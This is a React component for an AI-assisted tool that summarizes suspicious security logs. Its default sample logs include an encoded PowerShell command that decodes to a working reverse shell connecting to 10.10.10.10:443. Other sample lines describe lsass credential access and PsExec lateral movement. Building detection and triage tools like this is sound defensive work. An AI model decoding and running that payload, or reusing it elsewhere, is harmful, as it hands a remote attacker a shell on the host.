'use client';

import { useState } from 'react';
import { summarizeSuspiciousLogs } from '@/ai/flows/summarize-suspicious-logs';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Textarea } from '@/components/ui/textarea';
import { Wand2, LoaderCircle } from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';

const sampleLogs = `[2024-07-31T10:30:00Z] ProcessId 1337 accessed lsass.exe on DC01 from IP 10.1.1.25. Process path: C:\\temp\\malicious.exe
[2024-07-31T10:25:00Z] PsExec.exe used from 192.168.5.10 to connect to SRV-FIN-01. User: NT AUTHORITY\\SYSTEM
[2024-07-31T09:15:00Z] PowerShell command executed on workstation-112: "powershell.exe -enc IABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACcALAAnADQANAAzACcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAA7AH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKyAAKABwAHcAZABkACkALgBQAGEAdABoACAAKyAAIAA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApADsAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
`;

export function LogSummary() {
  const [logs, setLogs] = useState(sampleLogs);
  const [summary, setSummary] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSummarize = async () => {
    setLoading(true);
    setError('');
    setSummary('');
    try {
      const result = await summarizeSuspiciousLogs({ logs });
      setSummary(result.summary);
    } catch (e) {
      setError('Failed to get summary from AI. Please try again.');
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="font-headline">AI Log Summarizer</CardTitle>
        <CardDescription>
          Paste suspicious log entries and use GenAI to get a quick summary of potential threats.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <Textarea
          placeholder="Paste logs here..."
          className="min-h-[200px] font-code text-xs"
          value={logs}
          onChange={(e) => setLogs(e.target.value)}
        />
        <Button onClick={handleSummarize} disabled={loading}>
          {loading ? (
            <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />
          ) : (
            <Wand2 className="mr-2 h-4 w-4" />
          )}
          Summarize with AI
        </Button>
        {loading && (
          <div className="flex items-center gap-2 text-muted-foreground">
            <LoaderCircle className="h-4 w-4 animate-spin" />
            <span>Analyzing logs... this may take a moment.</span>
          </div>
        )}
        {error && (
            <Alert variant="destructive">
                <AlertTitle>Error</AlertTitle>
                <AlertDescription>{error}</AlertDescription>
            </Alert>
        )}
        {summary && (
          <Alert variant="default" className="bg-secondary">
            <Wand2 className="h-4 w-4" />
            <AlertTitle className='font-headline'>AI Summary</AlertTitle>
            <AlertDescription className="prose prose-sm prose-invert max-w-none">
              <p>{summary}</p>
            </AlertDescription>
          </Alert>
        )}
      </CardContent>
    </Card>
  );
}
